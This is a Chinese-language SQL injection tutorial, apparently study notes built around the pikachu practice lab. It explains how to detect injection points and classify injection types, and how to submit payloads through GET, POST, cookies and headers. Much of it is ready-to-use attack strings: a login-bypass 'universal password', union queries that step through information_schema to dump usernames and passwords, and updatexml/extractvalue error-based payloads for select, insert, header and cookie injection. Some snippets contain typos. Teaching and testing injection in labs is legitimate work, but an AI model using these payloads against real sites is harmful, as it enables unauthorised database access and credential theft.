<a name="Pp9PE"></a>
## SQL注入的准备工作
<a name="CXIAi"></a>
### 确定 Web 应用程序所使用的技术
可以考察 Web 页面的页脚，查看错误页面，检查页面源代码，或者使用诸如 Nessus、AWVS、 APPSCAN 等工具来进行刺探。
<a name="IJNCG"></a>
### 确定所有可能的输入方式
Web 应用的用户输入方式比较多，其中一些用户输入方式是很明显的，如 HTML 表单；<br />另外，攻击者可以通过隐藏的 HTML 表单输入、HTTP 头部、cookies、甚至对用户不可见的 后端AJAX 请求来跟 Web 应用进行交互。<br />一般来说，所有 HTTP 的 GET 和 POST 都应当作用户输入。<br />为了找出一个 Web 应用所有可能的用户输入，可以求助于 Web 代理，如 Burp 等。
<a name="kdph6"></a>
### 查找可以用于注入的用户输入
在找出所有用户输入方式后，就要对这些输入方式进行筛选，找出其中可以注入命令的那些输入方式。<br />多多留意 Web 应用的错误页面<br />通常只要带有输入提交的动态网页，并且动态网页访问数据库，都是潜在的探测点
```sql
# 万能密码:
'or '1'='1
## 源语句：
select * from user where name='xx' and pwd='hhh';
## 目标语句：
select * from user where name='' or '1'='1' and pwd='' or '1'='1'


#注入语句样例
and 1=2 union select 1,2,3 -- 
select user() regexp '^ro'
ascii(substr((select user()),1,1))=114
if(ascii(substr((select user()),1,1))=114,0,sleep 5)
ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=9
updatexml(1,concat(0x7e,(select @@version),0x7e),1)
```
<a name="nROZO"></a>
## 手工检测 SQL 注入点
最常用的 SQL 注入点判断方法，是在网站中寻找如下形式的网页链接。
```
http://www.xxxxx.com/xxx.asp?id=xx (ASP 注入)
http://www.xxxxx.com/xxx.php?id=xx (php 注入)
http://www.xxxxx.com/xxx.jsp?id=xx (jsp 注入)
http://www.xxxxx.com/xxx.aspx?id=xx (aspx 注入)
http://www.xxxxx.com/index.asp?id=8&page=99 （有多个参数，需要区分用哪个参数来验证注入）
http://www.xxxxx.com/index/new/id/8 伪静态
http://www.xxxxx.com/index/new/php-8.html 伪静态
```
<a name="EPR3O"></a>
## 判断是否存在sql注入
如何判断某个网页链接是否存在 SQL 注入漏洞呢?通常有两种检测方法。
<a name="Bmdne"></a>
### 单引号法
第一种检测 SQL 注入漏洞是否存在的方法是“单引号”法。方法很简单，直接在浏览器地址栏中的网址链接后加上一个单引号，如果页面不能正常显示，浏览器返回一些异常信息， 则说明该链接可能存在注入漏洞。
<a name="RmT81"></a>
### 1=1 和 1=2 法
很多时候检测提交包含引号的链接时，会提示非法字符，或直接不返回任何信息，这种情况下可以如下尝试：
```
#先在链接地址后加上 and 1=1，提交
xxx.com/xx.php?id=xx and 1=1
#再替换为and 1=2，提交
xxx.com/xx.php?id=xx and 1=2
#如果返回不同的页面， 那么说明存在 SQL 注入漏洞。
```
<a name="hntzm"></a>
### 两种方法的组合变种
```
'and 1=1 		/ and 1=2
'and '1'='1 	/ and '1'='2
'and 1 like 1	/ and 1 like 2
```
<a name="w7s7g"></a>
### 更多方法组合的常用判断语句
在插入的注入语句后面，增加`-+`或`#`，用以注释掉后面的正常语句<br />`#`有时会被过滤，因此可以使用url编码，将`#`表文`%23`<br />单引号也有可能会被过滤，可以换成双引号<br />可以在引号后加一两个括号，用以实现可能的语句闭合，如
```
or 1=1–+
or 1=1#
or 1=1%23
'or 1=1–+
"or 1=1–+
)or 1=1–+
')or 1=1–+
") or 1=1–+
"))or 1=1–+
```
<a name="QGi9v"></a>
## 注入分类
<a name="beXGn"></a>
### 数字型注入：`or 1=1`
当输入的参数为整型时，如ID、年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入。<br />这种数字型注入最多出现在ASP、PHP等弱类型语言中，弱类型语言会自动推导变量类型，<br />例如，参数id=8，PHP会自动推导变量id的数据类型为int类型，那么`id=8 and 1=1`，则会推导为string类型，这是弱类型语言的特性。<br />而对于Java、C#这类强类型语言，如果试图把一个字符串转换为int类型，则会抛出异常，无法继续执行。所以，强类型的语言很少存在数字型注入漏洞。
<a name="EP7lG"></a>
### 字符型注入：`' or 1=1#`
当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。
<a name="OupSx"></a>
### 搜索型注入：` %xxx% or 1=1 #%'`
当在搜索框搜索的时候，称为搜索型。搜索类型一般要使用百分号来闭合。
```sql
select * from 表名 where 字段名 like '%（对应值）%'; # 源
select * from 表名 where 字段名 like '%（对应值）or 1=1 #% %'; # 目标
```
<a name="ED7tx"></a>
### XX型注入： `xx') or 1=1#`
这种情况很少见，是程序员不规则操作造成的，没有找到例子。
<a name="KEsnK"></a>
## 注入提交方式
<a name="s3WFR"></a>
### 三种方式注入方法
<a name="iE6Ff"></a>
#### post
可通过安装火狐浏览器插件（hackbar）或 Burp 工具来完成
<a name="ZKhqy"></a>
#### get
一般直接通过浏览器地址栏提交
<a name="mT7sA"></a>
#### cookie
一般通 Burp 工具来完成，修改cookie，进行一个注入
<a name="nkEOS"></a>
### 请求头中可以利用的点
![2023-03-25-12-21-21.022855200.png](https://cdn.nlark.com/yuque/0/2023/png/396745/1679718538452-93226824-84d1-4803-b790-ee6a13937a1b.png#averageHue=%23e4d7ca&clientId=u8d4bcd38-bf2e-4&from=ui&id=u5d3f5c4b&originHeight=464&originWidth=836&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1166139&status=done&style=none&taskId=ucdf323ef-2d6c-46fc-9f63-3175321a48e&title=)
<a name="Xriwj"></a>
### ASP和PHP中的调用函数
```
# ASP
request （全部接受）
request.querystring （接受 get）
request.form （接受 post）
request.cookie（接受 cookie）
 
# PHP:
$_REQUEST（全部接受）
$_GET(接受get)
$_POST （接受 post）
$_COOKIE（接受 cookie） 

#一般中间件 waf 防火墙，对get防护最高，其次是post，最后是cookie  
#很多人在写注入防御代码时，写了post、get的，但是没有过滤cookie的
```
<a name="y3mEY"></a>
## 注入攻击的攻击手法
主要有：联合查询（union）注入、布尔盲注(base on boolian)、时间盲注(base on time)、报错信息注入、宽字节注入、偏移注入等。
<a name="GeIDc"></a>
### 联合查询（union）注入
所谓联合查询注入即是使用union合并两个或多个SELECT语句的结果集，第二个语句中就包含想要查询的语句
```
# payload
a' union select database(),user(),version() #%
```
<a name="YcYCM"></a>
#### 先使用`order by`确定字段个数
union 操作符一般与 order by 语句配合使用来确定可以查询的字段个数<br />因为查询的字段不能超过主查询的字段，可以先在 SQL 语句后面加 order by 进行排序，通过报错内容确定到底有几个字段可供使用
```sql
#采用二分法找到最大的可排序列，即是可查询的字段个数
a' order by 4 #% 
# 假定最后4不报错，5报错，则可确定有4个字段,payload可以这样
a' union select database(),user(),version(),4 #%
# 如果第二个字段才能显示在屏幕上，那么payload需这样凑成四个字段
a' union select 1,username,3,4 from user #%
```
<a name="c80tL"></a>
### information_schema 注入
information_schema数据库是MySQL5.0及以上系统自带的数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。<br />如果用于注入的账号，有能够读取该库的权限，那么离脱裤就非常非常近了
<a name="yYxQT"></a>
#### information_schema中的常用表
```
information_schema.tables #该库中保存其他库表名字的表
  table_schema        #上表中，保存库名的列
  table_name          #上表中，保存表名的列

information_schema.columns #改表中保存每个表的列名
  table_name          #上表中，保存表名的列
  column_name         #上表中，保存列名的列
```
<a name="NCVyr"></a>
### 一次完整的拆解获取过程
按照数据库的库-表-字段这个层次性进行一步步渗透
```sql
#1 先通过union找出数据库的名称
a' union select database(),user(),3 #%
#2 得到要爆破的数据库名pikachu后，获取相关表名
u' union select table_schema ,table_name,3 from information_schema.tables where table_schema='pikachu' #%
#3 获取表名后，查询columns表获取字段名
k' union select table_name,column_name,3 from information_schema.columns where table_name='users' #%
#4 最后通过具体表获取相关数据
kobe 'union select username ,password,3 from users #%
```
<a name="Ne3wl"></a>
## 基于函数报错手工注入
<a name="Qnps2"></a>
### 思路、条件、优缺点等
当数据库的函数被传入错误参数时，会发生语法错误，正常情况下这类错误不应该回显到前端页面，但当中间件或程序未正常屏蔽时导致错误信息输出到屏幕上，就能用来进行报错注入了。<br />select/insert/update/delete都可以被用来报错注入
<a name="BxaqE"></a>
#### 报错注入条件：

1. 后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端
2. 运维人员设置中间件的时候，错误输出没有屏蔽
3. 程序员写网站代码的时候，没有屏蔽错误信息输出
<a name="wki5g"></a>
#### 优缺点：

1. 优点是注入速度快
2. 缺点是语句较为复杂，而且只能用`limit`依次进行猜解

总体来说，报错注入其实是一种公式化的注入方法，主要用于在页面中没有显示位，但是用mysql输出了错误信息时使用。
<a name="bmygP"></a>
### 常用函数
<a name="PRnu2"></a>
#### `floor()`：MYSQL 中用来取整的函数
```sql
select count(*) from information_schema.tables group by concat((select version())),floor(rang(0)*2);
#concat 连接字符串功能
#floor  取float的整数值
#rang   取0-1之间随机浮点值
#group by   对结果集进行排序
select verson()就是我们用来做sql注入的语句
```
<a name="MLHLl"></a>
#### `extractvalue()`：MYSQL 对 XML 文档数据进行查询的 XPATH 函数
```sql
select extractvalue(1,concat(0x7e,(select user()),0x7e));
#extractvalue():接收2个参数,第一个xml文档,第二个xpath语句
#用concat构造一个错误的xpath字符串,使extractvalue函数报错,显示出构造的'错误'字符串
```
<a name="aPxAX"></a>
#### `updatexml()`：MYSQL 对 XML 文档数据进行查询和修改的 XPATH 函数
最常用的报错注入函数
```sql
select updatexml(1,concat(0x7e,(select user()),0x7e),1)
#接收3个参数,第一个xml文档,第二个xpath语句,第三个字符串
#原理和extravtvalue一样,构造错误的xpath语句报错
```
<a name="c2POF"></a>
### updatexml报错实战
<a name="NIjH4"></a>
#### select、delete语句注入
```
#1 爆数据库版本信息
k' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #
#2 爆数据库当前用户
k' and  updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) #
#3 爆数据库
k' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #
#4 爆表名
## 反馈回的错误表示只能显示一行，所以采用limit来一行一行显示
k'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0) #
#5 爆字段
k' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 2,1)),0) #
#6 爆字段内容
k' and  updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) #
```
<a name="uPPCX"></a>
#### insert、update、注入
增、改同样可以用来进行报错注入，只是需要前后分别用or语句连接，使语句完整，一般需要抓包用bp改参数
```sql
# 原语句
insert into xxx id values ('k');
# 报错注入语句
k' or updatexml(1,concat(0x7e,(命令)),0) or'
# 组合后语句
insert into xxx id values ('k' or updatexml(1,concat(0x7e,(命令)),0) or'');
```
<a name="QT1YR"></a>
#### head和cookie注入
如果代码调用了head或cookie中的信息拿到数据库进行拼接，也可以用报错注入尝试<br />同样是先用单引号找到注入点，在进行注入
```
# http head头注入，假如是对浏览器类型的检测
Mozilla ' or updatexml(1,concat(0x7e,database ()),0) or '
# cookie注入，假如原cookie为 ant[uname]=admin
ant[uname]=admin' and updatexml (1,concat(0x7e,database()),0) #
```
